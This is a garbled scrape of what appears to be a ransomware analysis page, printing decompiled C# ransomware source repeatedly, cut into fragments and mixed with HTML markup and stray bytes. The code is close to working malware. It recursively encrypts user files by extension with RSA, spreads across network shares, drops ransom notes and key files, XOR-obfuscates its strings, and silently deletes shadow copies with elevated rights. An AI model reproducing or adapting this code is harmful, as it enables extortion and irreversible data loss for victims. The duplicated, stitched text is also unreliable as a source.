.png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> , 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> , 0xf2, <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 